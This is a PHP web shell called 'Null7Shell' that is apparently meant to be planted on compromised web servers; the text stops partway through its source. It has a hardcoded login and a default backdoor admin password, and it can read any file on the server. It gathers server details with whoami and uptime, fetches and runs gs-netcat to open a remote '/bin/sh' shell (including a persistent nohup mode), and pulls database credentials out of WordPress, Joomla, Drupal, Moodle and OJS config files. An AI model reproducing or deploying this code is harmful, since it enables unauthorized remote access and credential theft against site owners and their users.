<?php

error_reporting(E_ERROR | E_PARSE);
@ini_set('display_errors', 0);
session_start();


define('N7_USER', 'null7');
define('N7_PASS', 'null7ganteng@gmail.com');
define('N7_HASH', hash('sha256', N7_USER . '::' . N7_PASS));
define('N7_NAME', 'Null7Shell');
define('N7_AUTHOR', 'null7');
define('N7_CONTACT', 'null7ganteng@gmail.com');
define('N7_VERSION', '9.4');
define('N7_DEFAULT_EMAIL', 'null7ganteng@gmail.com');
define('N7_DEFAULT_ADMIN_USER', 'null7admin');
define('N7_DEFAULT_ADMIN_PASS', 'Null7!Admin@2024');
define('N7_GS_URL_BASE', 'https://github.com/hackerschoice/gsocket/releases/latest/download');
define('N7_BG_GIF', 'https://media4.giphy.com/media/v1.Y2lkPTZjMDliOTUya241ajlqZXU1MDBvczB1dzV1NmlrMmhtMTJ3dHJhbXl5dTltMDJ5YyZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/Y34v7S5jENXAdbkfYh/giphy.gif');

if (empty($_SESSION['n7_csrf'])) $_SESSION['n7_csrf'] = bin2hex(random_bytes(16));


function n7_csrf_ok() { return isset($_POST['csrf']) && hash_equals($_SESSION['n7_csrf'], $_POST['csrf']); }
function h($s) { return htmlspecialchars((string)$s, ENT_QUOTES, 'UTF-8'); }
function n7_cwd() {
    $c = isset($_GET['d']) ? $_GET['d'] : getcwd();
    $r = @realpath($c);
    if ($r === false || !is_dir($r)) $r = getcwd();
    return rtrim($r, DIRECTORY_SEPARATOR);
}
function n7_size($bytes) {
    if ($bytes === false || $bytes === null || !is_numeric($bytes)) return 'N/A';
    $bytes = (float)$bytes;
    if ($bytes < 1024) return round($bytes) . ' B';
    $u = ['KB','MB','GB','TB']; $i = -1;
    do { $bytes /= 1024; $i++; } while ($bytes >= 1024 && $i < 3);
    return round($bytes, 2) . ' ' . $u[$i];
}
function n7_perm($f) {
    $p = @fileperms($f);
    if ($p === false) return '---------';
    return (($p & 0x100) ? 'r' : '-') . (($p & 0x80) ? 'w' : '-') . (($p & 0x40) ? 'x' : '-') .
           (($p & 0x20) ? 'r' : '-') . (($p & 0x10) ? 'w' : '-') . (($p & 0x8) ? 'x' : '-') .
           (($p & 0x4) ? 'r' : '-') . (($p & 0x2) ? 'w' : '-') . (($p & 0x1) ? 'x' : '-');
}
function n7_perm_class($file) {
    $p = @fileperms($file);
    if ($p === false) return 'perm-unknown';
    $oct = str_pad(substr(sprintf('%o', $p), -4), 4, '0', STR_PAD_LEFT);
    $mode = substr($oct, 1);
    if ($mode === '000') return 'perm-locked';
    if (in_array($mode, ['777','776','775','666','555','444','111'])) return 'perm-danger';
    if (in_array($mode, ['755','750','700','644','640','600','660','664','754','744'])) return 'perm-safe';
    return 'perm-warn';
}
function n7_perm_label($file) {
    $p = @fileperms($file);
    return $p === false ? '????' : substr(sprintf('%o', $p), -4);
}


function n7_self_host() {
    return strtolower(preg_replace('/:\d+$/', '', $_SERVER['HTTP_HOST'] ?? 'localhost'));
}
function n7_self_base() {
    $sch = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
    return $sch . '://' . ($_SERVER['HTTP_HOST'] ?? 'localhost');
}
function n7_validate_target($target) {
    $host = strtolower(parse_url($target, PHP_URL_HOST) ?: '');
    $self = n7_self_host();
    if ($host === '') return false;
    return $host === $self || str_ends_with($self, '.' . $host) || str_ends_with($host, '.' . $self);
}


function n7_detect_ip() {
    foreach (['HTTP_X_FORWARDED_FOR','HTTP_X_REAL_IP','HTTP_CF_CONNECTING_IP','HTTP_X_CLIENT_IP','SERVER_ADDR'] as $k) {
        if (!empty($_SERVER[$k])) {
            $v = trim(explode(',', $_SERVER[$k])[0]);
            if ($v && !in_array($v, ['127.0.0.1','::1','localhost']) && filter_var($v, FILTER_VALIDATE_IP)) return $v;
        }
    }
    $host = n7_self_host();
    if ($host) {
        $ip = @gethostbyname($host);
        if ($ip && $ip !== $host && !in_array($ip, ['127.0.0.1','::1'])) return $ip;
    }
    return $_SERVER['SERVER_ADDR'] ?? 'unknown';
}
function n7_detect_user() {
    if (function_exists('posix_getpwuid') && function_exists('posix_geteuid')) {
        $u = @posix_getpwuid(posix_geteuid());
        if ($u && !empty($u['name'])) return $u['name'];
    }
    if (function_exists('get_current_user')) {
        $u = @get_current_user();
        if ($u) return $u;
    }
    if (function_exists('shell_exec')) {
        $u = @trim((string)@shell_exec('whoami 2>/dev/null'));
        if ($u) return $u;
    }
    foreach (['USER','LOGNAME','APACHE_RUN_USER'] as $k) {
        $v = @getenv($k);
        if ($v) return $v;
    }
    return 'unknown';
}
function n7_detect_uptime() {
    $u = @file_get_contents('/proc/uptime');
    if ($u) {
        $s = (float)explode(' ', trim($u))[0];
        return floor($s/86400) . 'd ' . floor(($s%86400)/3600) . 'h ' . floor(($s%3600)/60) . 'm';
    }
    if (function_exists('shell_exec')) {
        $u = @trim((string)@shell_exec('uptime 2>/dev/null'));
        if ($u) return substr($u, 0, 60);
    }
    return 'N/A';
}
function n7_server_info() {
    $i = [];
    $i['php']         = PHP_VERSION;
    $i['sapi']        = PHP_SAPI;
    $i['os']          = php_uname('s') . ' ' . php_uname('r');
    $i['hostname']    = php_uname('n');
    $i['server_sw']   = $_SERVER['SERVER_SOFTWARE'] ?? 'unknown';
    $i['ip']          = n7_detect_ip();
    $i['port']        = $_SERVER['SERVER_PORT'] ?? '?';
    $i['doc_root']    = $_SERVER['DOCUMENT_ROOT'] ?? '?';
    $i['user']        = n7_detect_user();
    $i['uid']         = function_exists('posix_getuid') ? posix_getuid() : '-';
    $i['mem_limit']   = ini_get('memory_limit') ?: '?';
    $i['mem_used']    = function_exists('memory_get_usage') ? n7_size(memory_get_usage(true)) : 'N/A';

    $df = @disk_free_space('/'); $dt = @disk_total_space('/');
    $i['disk_free']  = ($df !== false && is_numeric($df)) ? n7_size($df) : 'N/A';
    $i['disk_total'] = ($dt !== false && is_numeric($dt)) ? n7_size($dt) : 'N/A';

    $i['curl']         = function_exists('curl_init') ? 'YES' : 'NO';
    $i['shell_exec']   = function_exists('shell_exec') ? 'YES' : 'NO';
    $i['mysqli']       = function_exists('mysqli_connect') ? 'YES' : 'NO';
    $i['pdo_mysql']    = (class_exists('PDO') && in_array('mysql', PDO::getAvailableDrivers())) ? 'YES' : 'NO';
    $i['uptime']       = n7_detect_uptime();
    $i['load']         = function_exists('sys_getloadavg') ? implode('/', array_map(fn($v)=>round($v,2), (array)sys_getloadavg())) : 'N/A';
    return $i;
}


$logged = !empty($_SESSION['n7_auth']) && $_SESSION['n7_auth'] === N7_HASH;
if (!$logged && isset($_POST['login_user'], $_POST['login_pass'])) {
    if (hash_equals(N7_USER, (string)$_POST['login_user']) && hash_equals(N7_PASS, (string)$_POST['login_pass'])) {
        $_SESSION['n7_auth'] = N7_HASH;
        header('Location: ?'); exit;
    } else { $login_err = 'ACCESS DENIED'; }
}
if (isset($_GET['logout'])) { $_SESSION = []; session_destroy(); header('Location: ?'); exit; }

if (!$logged) {
    $login_failed = !empty($login_err);
    $bg = N7_BG_GIF;
?><!DOCTYPE html><html lang="id"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title><?=N7_NAME?></title>
<style>
*{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
body{background:#050005;min-height:100vh;display:flex;align-items:center;justify-content:center;
  font-family:'Courier New',monospace;color:#e0d0e8;padding:16px;
  background-image:
    linear-gradient(rgba(20,0,25,.35), rgba(10,0,20,.5)),
    url('<?=$bg?>');
  background-size:cover;background-position:center center;
  background-attachment:fixed;background-repeat:no-repeat}
body::before{content:'';position:fixed;inset:0;pointer-events:none;z-index:0;
  background:
    radial-gradient(circle at 15% 0%, rgba(120,0,80,.3) 0%, transparent 50%),
    radial-gradient(circle at 85% 100%, rgba(0,80,100,.25) 0%, transparent 50%),
    radial-gradient(ellipse at center, transparent 45%, rgba(0,0,0,.75) 100%);
  mix-blend-mode:multiply}
body::after{content:'';position:fixed;inset:0;pointer-events:none;z-index:0;
  background:repeating-linear-gradient(0deg,transparent 0 3px,rgba(255,0,60,.02) 3px 4px);
  animation:scanline 8s linear infinite}
@keyframes scanline{0%{background-position:0 0}100%{background-position:0 100%}}
.lb{position:relative;z-index:2;
  background:linear-gradient(135deg, rgba(40,0,50,.72), rgba(15,0,25,.82));
  backdrop-filter:blur(16px) saturate(1.3);-webkit-backdrop-filter:blur(16px) saturate(1.3);
  border:2px solid rgba(180,0,80,.7);
  border-radius:14px;
  padding:30px 24px;width:100%;max-width:400px;
  box-shadow:
    0 0 60px rgba(255,0,60,.4),
    0 0 100px rgba(150,0,180,.25),
    inset 0 0 40px rgba(180,0,80,.15)}
.skull{font-size:80px;text-align:center;color:#ff2a5f;
  text-shadow:0 0 20px #ff0040,0 0 50px #aa0050,0 0 3px #000;
  animation:pulse 2.2s infinite;margin-bottom:6px}
@keyframes pulse{0%,100%{opacity:.88;transform:scale(1)}50%{opacity:1;transform:scale(1.07)}}
h1{text-align:center;color:#ff4477;letter-spacing:4px;font-size:20px;
  text-shadow:0 0 14px #ff0040,0 0 4px #000;margin-bottom:16px}
label{display:block;color:#d080a0;font-size:11px;margin:12px 0 5px;letter-spacing:1px;text-shadow:0 0 3px #000}
input{width:100%;padding:12px 14px;
  background:rgba(30,0,40,.85);border:1px solid #a00060;border-radius:6px;
  color:#ffb0d0;font-family:inherit;font-size:14px;outline:none;transition:.2s;
  backdrop-filter:blur(4px);-webkit-backdrop-filter:blur(4px)}
input:focus{border-color:#ff2a5f;
  box-shadow:0 0 18px rgba(255,0,60,.6);background:rgba(45,0,55,.9)}
button{width:100%;margin-top:20px;padding:14px;
  background:linear-gradient(180deg,#a0003a,#500020);
  border:1px solid #ff2a5f;border-radius:6px;color:#ffffff;
  font-family:inherit;font-size:13px;font-weight:bold;letter-spacing:4px;cursor:pointer;
  text-shadow:0 0 8px #ff0040,0 0 3px #000;transition:.2s;
  box-shadow:0 0 20px rgba(180,0,80,.4)}
button:hover{background:linear-gradient(180deg,#d0004a,#800030);
  box-shadow:0 0 30px rgba(255,0,60,.75)}
.err{background:rgba(160,0,50,.4);border:1px solid #ff2a5f;color:#ff7080;
  padding:9px;border-radius:6px;font-size:11px;text-align:center;margin-bottom:10px;letter-spacing:1px}
.foot{text-align:center;color:#996080;font-size:10px;margin-top:14px;letter-spacing:1px;text-shadow:0 0 3px #000}
@media(max-width:400px){.skull{font-size:65px}h1{font-size:17px}.lb{padding:24px 16px}}
</style></head><body>
<div class="lb">
  <div class="skull">☠</div>
  <h1><?=N7_NAME?></h1>
  <?php if (!empty($login_err)): ?><div class="err"><?=h($login_err)?></div><?php endif; ?>
  <form method="post" autocomplete="off" id="loginForm">
    <label>USERNAME</label><input type="text" name="login_user" required autofocus>
    <label>PASSWORD</label><input type="password" name="login_pass" required>
    <button type="submit">ENTER</button>
  </form>
  <div class="foot">BY <?=N7_AUTHOR?> // v<?=N7_VERSION?></div>
</div>
<script>
var ac = null;
function getAC(){ if(!ac){ try{ ac = new (window.AudioContext||window.webkitAudioContext)(); }catch(e){} } return ac; }
function beep(f, d, type){ var c = getAC(); if(!c) return;
  var o = c.createOscillator(), g = c.createGain();
  o.type = type || 'square'; o.frequency.value = f || 700;
  g.gain.setValueAtTime(0.06, c.currentTime);
  g.gain.exponentialRampToValueAtTime(0.001, c.currentTime+(d||0.1));
  o.connect(g); g.connect(c.destination); o.start(); o.stop(c.currentTime+(d||0.1)); }
function accessDenied(){
  beep(400, 0.15, 'sawtooth');
  setTimeout(function(){ beep(300, 0.15, 'sawtooth'); }, 120);
  setTimeout(function(){ beep(200, 0.25, 'sawtooth'); }, 240);
  setTimeout(function(){ beep(150, 0.4, 'sawtooth'); }, 420);
}
<?php if ($login_failed): ?>accessDenied();<?php endif; ?>
document.getElementById('loginForm').addEventListener('submit', function(e){
  try { localStorage.setItem('n7_login_success', '1'); } catch(e2) {}
});
</script>
</body></html>
<?php
    exit;
}


if (isset($_GET['action']) && $_GET['action'] === 'readfile' && !empty($_GET['f'])) {
    header('Content-Type: application/json');
    try {
        $f = $_GET['f'];
        $real = @realpath($f);
        if ($real === false || !is_file($real)) { echo json_encode(['ok' => false, 'error' => 'File not found']); exit; }
        if (!is_readable($real)) { echo json_encode(['ok' => false, 'error' => 'File not readable']); exit; }
        $content = @file_get_contents($real);
        if ($content === false) { echo json_encode(['ok' => false, 'error' => 'Read failed']); exit; }
        if (strlen($content) > 2 * 1024 * 1024) { echo json_encode(['ok' => false, 'error' => 'File too large (>2MB)']); exit; }
        echo json_encode(['ok' => true, 'content' => $content]);
    } catch (Throwable $ex) { echo json_encode(['ok' => false, 'error' => $ex->getMessage()]); }
    exit;
}


$page = $_GET['p'] ?? 'home';
if ($page === 'cms') $page = 'exploit';
if (!in_array($page, ['home', 'exploit', 'gsocket', 'tools'])) $page = 'home';

$msg = ''; $msg_type = 'ok'; $action_done = '';
$cwd = n7_cwd();
$self_host = n7_self_host();
$self_base = n7_self_base();
$srv = n7_server_info();
$csrf = $_SESSION['n7_csrf'];


function n7_gs_arch() {
    $u = php_uname('m');
    $map = ['x86_64'=>'linux-x86_64','amd64'=>'linux-x86_64','i386'=>'linux-x86_32',
            'i686'=>'linux-x86_32','aarch64'=>'linux-arm64','arm64'=>'linux-arm64',
            'armv7l'=>'linux-armv7','armv6l'=>'linux-armv6','mips'=>'linux-mips',
            'mips64'=>'linux-mips64','riscv64'=>'linux-riscv64'];
    return $map[$u] ?? 'linux-x86_64';
}
function n7_gs_which() {
    if (function_exists('shell_exec')) {
        $out = @trim((string)@shell_exec('command -v gs-netcat 2>/dev/null'));
        if ($out && strpos($out, 'gs-netcat') !== false) return $out;
    }
    $paths = ['/usr/local/bin/gs-netcat', '/usr/bin/gs-netcat', '/bin/gs-netcat',
              '/tmp/gs-netcat', '/var/tmp/gs-netcat', '/dev/shm/gs-netcat', getcwd() . '/gs-netcat'];
    foreach ($paths as $p) if (@is_file($p) && @is_executable($p)) return $p;
    return null;
}
function n7_gs_session_file() {
    $dirs = [getcwd(), '/tmp', sys_get_temp_dir(), '/var/tmp', '/dev/shm'];
    foreach ($dirs as $d) {
        if (@is_dir($d) && @is_writable($d)) return rtrim($d, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . '.n7_gs_session';
    }
    return sys_get_temp_dir() . '/.n7_gs_session';
}
function n7_gs_generate_session() {
    $chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    $len = 22; $s = '';
    try {
        if (function_exists('random_bytes')) {
            $b = random_bytes($len);
            for ($i = 0; $i < $len; $i++) $s .= $chars[ord($b[$i]) % strlen($chars)];
        } else {
            for ($i = 0; $i < $len; $i++) $s .= $chars[random_int(0, strlen($chars) - 1)];
        }
    } catch (Throwable $e) {
        for ($i = 0; $i < $len; $i++) $s .= $chars[rand(0, strlen($chars) - 1)];
    }
    return $s;
}
function n7_gs_get_session() {
    $file = n7_gs_session_file();
    if (@is_file($file)) {
        $s = @trim((string)@file_get_contents($file));
        if (strlen($s) >= 10) return $s;
    }
    $s = n7_gs_generate_session();
    @file_put_contents($file, $s);
    @chmod($file, 0600);
    return $s;
}
function n7_gs_set_session($sess) {
    $sess = trim($sess);
    if (strlen($sess) < 10) return false;
    $r = @file_put_contents(n7_gs_session_file(), $sess);
    if ($r !== false) @chmod(n7_gs_session_file(), 0600);
    return $r !== false;
}
function n7_gs_regenerate_session() {
    $s = n7_gs_generate_session();
    n7_gs_set_session($s);
    return $s;
}
function n7_gs_download($dest) {
    $arch = n7_gs_arch();
    $url = N7_GS_URL_BASE . '/gs-netcat_' . $arch;
    $log = "Arch: $arch\nURL: $url\nDest: $dest\n";
    if (function_exists('curl_init')) {
        $fp = @fopen($dest, 'wb');
        if ($fp) {
            $ch = curl_init($url);
            curl_setopt_array($ch, [CURLOPT_FILE => $fp, CURLOPT_FOLLOWLOCATION => true, CURLOPT_MAXREDIRS => 5,
                CURLOPT_TIMEOUT => 90, CURLOPT_CONNECTTIMEOUT => 20, CURLOPT_SSL_VERIFYPEER => false,
                CURLOPT_SSL_VERIFYHOST => false, CURLOPT_USERAGENT => 'Mozilla/5.0']);
            $ok = curl_exec($ch); $code = curl_getinfo($ch, CURLINFO_HTTP_CODE); $err = curl_error($ch);
            curl_close($ch); fclose($fp);
            if ($ok && $code == 200 && @filesize($dest) > 10000) return ['ok' => true, 'log' => $log . "✔ Downloaded (HTTP $code) - " . n7_size(@filesize($dest)) . "\n"];
            @unlink($dest); $log .= "✘ curl HTTP $code $err\n";
        }
    }
    if (function_exists('file_get_contents')) {
        $ctx = stream_context_create(['http' => ['timeout' => 90, 'user_agent' => 'Mozilla/5.0', 'follow_location' => 1, 'max_redirects' => 5],
            'ssl' => ['verify_peer' => false, 'verify_peer_name' => false]]);
        $data = @file_get_contents($url, false, $ctx);
        if ($data !== false && strlen($data) > 10000) {
            if (@file_put_contents($dest, $data) !== false) return ['ok' => true, 'log' => $log . "✔ Downloaded via fgc - " . n7_size(strlen($data)) . "\n"];
        }
        $log .= "✘ fgc failed\n";
    }
    if (function_exists('shell_exec')) {
        @shell_exec("wget -q --no-check-certificate -O " . escapeshellarg($dest) . " " . escapeshellarg($url) . " 2>/dev/null || curl -sLk -o " . escapeshellarg($dest) . " " . escapeshellarg($url) . " 2>/dev/null");
        if (@is_file($dest) && @filesize($dest) > 10000) return ['ok' => true, 'log' => $log . "✔ Downloaded via shell - " . n7_size(@filesize($dest)) . "\n"];
        $log .= "✘ shell failed\n";
    }
    return ['ok' => false, 'log' => $log];
}
function n7_gs_install() {
    $log = "=== INSTALL ===\n" . str_repeat('=', 50) . "\n";
    $existing = n7_gs_which();
    if ($existing) { $log .= "✔ Already installed: $existing\n"; return ['ok' => true, 'path' => $existing, 'log' => $log]; }
    $candidates = [getcwd(), '/tmp', sys_get_temp_dir(), '/var/tmp', '/dev/shm'];
    $dest = null;
    foreach ($candidates as $c) {
        if (@is_dir($c) && @is_writable($c)) { $dest = rtrim($c, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . 'gs-netcat'; break; }
    }
    if (!$dest) return ['ok' => false, 'path' => null, 'log' => $log . "✘ No writable dir.\n"];
    $dl = n7_gs_download($dest);
    $log .= $dl['log'];
    if (!$dl['ok']) return ['ok' => false, 'path' => null, 'log' => $log];
    @chmod($dest, 0755);
    if (!@is_executable($dest) && function_exists('shell_exec')) @shell_exec('chmod +x ' . escapeshellarg($dest) . ' 2>/dev/null');
    if (!@is_executable($dest)) return ['ok' => false, 'path' => $dest, 'log' => $log . "✘ chmod failed.\n"];
    $log .= "✔ chmod +x OK\n";
    if (function_exists('shell_exec')) {
        $v = @trim((string)@shell_exec(escapeshellarg($dest) . ' --version 2>&1'));
        if ($v) $log .= "Version: " . substr($v, 0, 200) . "\n";
    }
    $log .= "✔ Install complete: $dest\n";
    return ['ok' => true, 'path' => $dest, 'log' => $log];
}
function n7_gs_run($session = null, $mode = 'interactive', $timeout_sec = 30) {
    if ($session === null || $session === '') $session = n7_gs_get_session();
    $log = "=== RUN ===\n" . str_repeat('=', 50) . "\nSession: $session\nMode: $mode\n";
    $bin = n7_gs_which();
    if (!$bin) return "✘ gs-netcat not found.\n";
    $log .= "Binary: $bin\n";
    if (!function_exists('shell_exec') && !function_exists('exec')) return $log . "✘ shell_exec & exec disabled.\n";
    $b = escapeshellarg($bin); $s = escapeshellarg($session);
    switch ($mode) {
        case 'exec':   $cmd = "timeout $timeout_sec $b -s $s -e /bin/sh 2>&1"; break;
        case 'listen': $cmd = "timeout $timeout_sec $b -s $s -l -i 2>&1"; break;
        case 'daemon': $cmd = "nohup $b -s $s -i >/dev/null 2>&1 & echo PID:\$!"; break;
        default:       $cmd = "timeout $timeout_sec $b -s $s -i 2>&1";
    }
    $log .= "CMD: $cmd\n" . str_repeat('─', 50) . "\n";
    if (function_exists('shell_exec')) { $out = @shell_exec($cmd); $log .= ($out === null ? "(no output)" : (string)$out); }
    elseif (function_exists('exec')) { @exec($cmd, $o); $log .= implode("\n", (array)$o); }
    $log .= "\n" . str_repeat('─', 50) . "\nListener VPS:  gs-netcat -s \"$session\" -l -i\n";
    return $log;
}
function n7_gs_auto($session = null, $delay = 0) {
    if ($session === null || $session === '') $session = n7_gs_get_session();
    $log = "=== GSOCKET AUTO (1-CLICK) ===\n" . str_repeat('=', 50) . "\nSESSION UNIK WEBSITE: $session\n\n";
    $inst = n7_gs_install();
    $log .= $inst['log'] . "\n";
    if (!$inst['ok']) return $log . "✘ Install failed.\n";
    if ($delay > 0) { sleep($delay); $log .= "Delay {$delay}s\n"; }
    $log .= "\n" . n7_gs_run($session, 'interactive', 30);
    return $log;
}


function n7_get($url, $t = 10, $h = []) {
    if (!function_exists('curl_init')) {
        $ctx = stream_context_create(['http' => ['timeout' => $t, 'ignore_errors' => true, 'header' => implode("\r\n", array_merge(['User-Agent: Mozilla/5.0'], $h))],
            'ssl' => ['verify_peer' => false, 'verify_peer_name' => false]]);
        $b = @file_get_contents($url, false, $ctx);
        $c = 0;
        if (!empty($http_response_header[0]) && preg_match('/\s(\d+)\s/', $http_response_header[0], $m)) $c = (int)$m[1];
        return ['code' => $c, 'body' => $b === false ? '' : $b, 'error' => $b === false ? 'fail' : ''];
    }
    $ch = curl_init($url);
    curl_setopt_array($ch, [CURLOPT_RETURNTRANSFER => true, CURLOPT_FOLLOWLOCATION => true, CURLOPT_MAXREDIRS => 3,
        CURLOPT_TIMEOUT => $t, CURLOPT_CONNECTTIMEOUT => 5, CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false, CURLOPT_HTTPHEADER => array_merge(['User-Agent: Mozilla/5.0'], $h)]);
    $b = curl_exec($ch); $c = curl_getinfo($ch, CURLINFO_HTTP_CODE); $e = curl_error($ch);
    curl_close($ch);
    return ['code' => $c, 'body' => (string)$b, 'error' => $e];
}
function n7_post($url, $data, $h = [], $t = 10, $json = false) {
    if (!function_exists('curl_init')) {
        $hs = array_merge(['User-Agent: Mozilla/5.0'], $h);
        $hs[] = $json ? 'Content-Type: application/json' : 'Content-Type: application/x-www-form-urlencoded';
        $ctx = stream_context_create(['http' => ['timeout' => $t, 'method' => 'POST', 'ignore_errors' => true, 'header' => implode("\r\n", $hs),
            'content' => is_string($data) ? $data : ($json ? json_encode($data) : http_build_query($data))],
            'ssl' => ['verify_peer' => false, 'verify_peer_name' => false]]);
        $b = @file_get_contents($url, false, $ctx);
        return ['code' => 0, 'body' => $b === false ? '' : $b, 'error' => $b === false ? 'fail' : ''];
    }
    $ch = curl_init($url);
    $hs = array_merge(['User-Agent: Mozilla/5.0'], $h);
    if ($json) $hs[] = 'Content-Type: application/json';
    curl_setopt_array($ch, [CURLOPT_RETURNTRANSFER => true, CURLOPT_FOLLOWLOCATION => true, CURLOPT_TIMEOUT => $t,
        CURLOPT_CONNECTTIMEOUT => 5, CURLOPT_SSL_VERIFYPEER => false, CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_POST => true, CURLOPT_POSTFIELDS => is_string($data) ? $data : ($json ? json_encode($data) : http_build_query($data)),
        CURLOPT_HTTPHEADER => $hs]);
    $b = curl_exec($ch); $c = curl_getinfo($ch, CURLINFO_HTTP_CODE); $e = curl_error($ch);
    curl_close($ch);
    return ['code' => $c, 'body' => (string)$b, 'error' => $e];
}

function n7_db_connect($host, $user, $pass, $name, $port = 3306) {
    if (function_exists('mysqli_connect')) {
        $l = @mysqli_connect($host, $user, $pass, $name, (int)$port);
        if ($l) { @mysqli_set_charset($l, 'utf8mb4'); return ['type' => 'mysqli', 'link' => $l]; }
    }
    if (class_exists('PDO')) {
        try {
            $pdo = new PDO("mysql:host=$host;port=$port;dbname=$name;charset=utf8mb4", $user, $pass, [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION]);
            return ['type' => 'pdo', 'link' => $pdo];
        } catch (Throwable $e) {}
    }
    return null;
}
function n7_db_q($conn, $sql) {
    if ($conn['type'] === 'mysqli') {
        $r = @mysqli_query($conn['link'], $sql);
        if ($r === true) return ['ok' => true, 'rows' => []];
        if ($r === false) return ['ok' => false, 'error' => mysqli_error($conn['link']), 'rows' => []];
        $rows = [];
        while ($row = @mysqli_fetch_assoc($r)) $rows[] = $row;
        return ['ok' => true, 'rows' => $rows];
    }
    if ($conn['type'] === 'pdo') {
        try { $st = $conn['link']->query($sql); return ['ok' => true, 'rows' => $st ? $st->fetchAll(PDO::FETCH_ASSOC) : []]; }
        catch (Throwable $e) { return ['ok' => false, 'error' => $e->getMessage(), 'rows' => []]; }
    }
    return ['ok' => false, 'error' => 'no connector', 'rows' => []];
}


function n7_find_configs($root = null) {
    $dirs = [];
    if ($root && is_dir($root)) $dirs[] = $root;
    else {
        foreach ([$_SERVER['DOCUMENT_ROOT'] ?? '', getcwd()] as $d) if ($d && is_dir($d)) $dirs[] = $d;
        $w = getcwd();
        for ($i = 0; $i < 6; $i++) { $w = dirname($w); if ($w === '/' || $w === '.') break; $dirs[] = $w; }
    }
    $dirs = array_unique(array_filter($dirs));
    $out = [];
    foreach ($dirs as $d) {
        $checks = [
            '/wp-config.php' => ['cms' => 'WordPress', 'parser' => 'n7_parse_wp'],
            '/config.php' => ['cms' => 'Moodle', 'parser' => 'n7_parse_moodle'],
            '/configuration.php' => ['cms' => 'Joomla', 'parser' => 'n7_parse_joomla'],
            '/sites/default/settings.php' => ['cms' => 'Drupal', 'parser' => 'n7_parse_drupal'],
            '/config.inc.php' => ['cms' => 'OJS', 'parser' => 'n7_parse_ojs'],
        ];
        foreach ($checks as $file => $meta) {
            $full = $d . $file;
            if (is_file($full) && is_readable($full)) {
                $cfg = call_user_func($meta['parser'], $full);
                if ($cfg) $out[] = ['cms' => $meta['cms'], 'path' => $full, 'db' => $cfg['db'], 'prefix' => $cfg['prefix']];
            }
        }
        $parent_wp = dirname($d) . '/wp-config.php';
        if (is_file($parent_wp) && is_readable($parent_wp)) {
            $cfg = n7_parse_wp($parent_wp);
            if ($cfg) $out[] = ['cms' => 'WordPress', 'path' => $parent_wp, 'db' => $cfg['db'], 'prefix' => $cfg['prefix']];
        }
    }
    $seen = []; $final = [];
    foreach ($out as $o) { if (!isset($seen[$o['path']])) { $seen[$o['path']] = 1; $final[] = $o; } }
    return $final;
}
function n7_parse_wp($path) {
    $c = @file_get_contents($path); if (!$c) return null;
    $db = ['host' => null, 'user' => null, 'pass' => null, 'name' => null, 'port' => 3306]; $prefix = 'wp_';
    foreach (['DB_NAME','DB_USER','DB_PASSWORD','DB_HOST'] as $k) {
        if (preg_match("/define\s*\(\s*['\"]" . $k . "['\"]\s*,\s*['\"]([^'\"]*)['\"]/i", $c, $m)) {
            $v = $m[1];
            if ($k === 'DB_NAME') $db['name'] = $v;
            elseif ($k === 'DB_USER') $db['user'] = $v;
            elseif ($k === 'DB_PASSWORD') $db['pass'] = $v;
            elseif ($k === 'DB_HOST') { if (strpos($v, ':') !== false) { list($h, $p) = explode(':', $v, 2); $db['host'] = $h; $db['port'] = (int)$p; } else $db['host'] = $v; }
        }
    }
    if (preg_match('/\$table_prefix\s*=\s*[\'"]([^\'"]+)[\'"]/', $c, $m)) $prefix = $m[1];
    if (!$db['host'] || !$db['name'] || !$db['user']) return null;
    return ['db' => $db, 'prefix' => $prefix];
}
function n7_parse_moodle($path) {
    $c = @file_get_contents($path); if (!$c) return null;
    $db = ['host' => null, 'user' => null, 'pass' => null, 'name' => null, 'port' => 3306]; $prefix = 'mdl_';
    foreach (['dbhost','dbuser','dbpass','dbname','prefix'] as $k) {
        if (preg_match('/\$CFG->' . $k . '\s*=\s*[\'"]([^\'"]*)[\'"]/i', $c, $m)) {
            $v = $m[1];
            if ($k === 'dbhost') { if (strpos($v, ':') !== false) { list($h,$p) = explode(':', $v, 2); $db['host'] = $h; $db['port'] = (int)$p; } else $db['host'] = $v; }
            elseif ($k === 'dbuser') $db['user'] = $v;
            elseif ($k === 'dbpass') $db['pass'] = $v;
            elseif ($k === 'dbname') $db['name'] = $v;
            elseif ($k === 'prefix') $prefix = $v;
        }
    }
    if (!$db['host'] || !$db['name'] || !$db['user']) return null;
    return ['db' => $db, 'prefix' => $prefix];
}
function n7_parse_joomla($path) {
    $c = @file_get_contents($path); if (!$c) return null;
    $db = ['host' => null, 'user' => null, 'pass' => null, 'name' => null, 'port' => 3306]; $prefix = 'jos_';
    foreach (['host','user','password','db','dbprefix'] as $k) {
        if (preg_match('/public\s+\$' . $k . '\s*=\s*[\'"]([^\'"]*)[\'"]/i', $c, $m)) {
            $v = $m[1];
            if ($k === 'host') { if (strpos($v, ':') !== false) { list($h,$p) = explode(':', $v, 2); $db['host'] = $h; $db['port'] = (int)$p; } else $db['host'] = $v; }
            elseif ($k === 'user') $db['user'] = $v;
            elseif ($k === 'password') $db['pass'] = $v;
            elseif ($k === 'db') $db['name'] = $v;
            elseif ($k === 'dbprefix') $prefix = $v;
        }
    }
    if (!$db['host'] || !$db['name'] || !$db['user']) return null;
    return ['db' => $db, 'prefix' => $prefix];
}
function n7_parse_drupal($path) {
    $c = @file_get_contents($path); if (!$c) return null;
    $db = ['host' => null, 'user' => null, 'pass' => null, 'name' => null, 'port' => 3306];
    if (preg_match_all("/['\"](database|username|password|host)['\"]\s*=>\s*['\"]([^'\"]*)['\"]/i", $c, $mm, PREG_SET_ORDER)) {
        foreach ($mm as $m) {
            $k = strtolower($m[1]);
            if ($k === 'database') $db['name'] = $m[2];
            elseif ($k === 'username') $db['user'] = $m[2];
            elseif ($k === 'password') $db['pass'] = $m[2];
            elseif ($k === 'host') $db['host'] = $m[2];
        }
    }
